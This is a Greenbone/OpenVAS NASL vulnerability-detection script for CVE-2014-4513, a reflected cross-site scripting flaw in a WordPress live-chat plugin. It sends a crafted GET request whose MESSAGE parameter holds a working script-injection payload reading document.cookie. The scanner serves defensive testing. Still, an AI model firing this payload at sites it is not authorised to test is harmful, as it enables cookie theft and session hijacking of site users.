CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804686" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_cve_id( "CVE-2014-4513" );
	script_bugtraq_id( 68312 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2014-07-21 16:32:02 +0530 (Mon, 21 Jul 2014)" );
	script_name( "WordPress ActiveHelper LiveHelp Live Chat Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress ActiveHelper LiveHelp Live Chat Plugin
and is prone to cross-site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not." );
	script_tag( name: "insight", value: "Input passed via the 'message', 'email', 'name', 'company' and 'phone'
parameters to server/offline.php script is not properly sanitised before
returning to the user." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary HTML and
script code in a user's browser session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress ActiveHelper LiveHelp Live Chat Plugin version 3.1.0 and earlier." );
	script_tag( name: "solution", value: "Update to WordPress ActiveHelper LiveHelp Live Chat Plugin version 3.1.5
or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://wordpress.org/plugins/activehelper-livehelp" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/activehelper-livehelp/server/offline.php?" + "MESSAGE=\"></textarea><script>alert(document.cookie)</script>&" + "DOMAINID=DOMAINID&COMPLETE=COMPLETE&TITLE=TITLE&URL=URL&COMPA" + "NY=COMPANY&SERVER=SERVER&PHONE=PHONE&SECURITY=SECURITY&BCC=BC" + "C&EMAIL=EMAIL&NAME=NAME";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: ">www.activehelper.com Live Help<" )){
	security_message( http_port );
	exit( 0 );
}

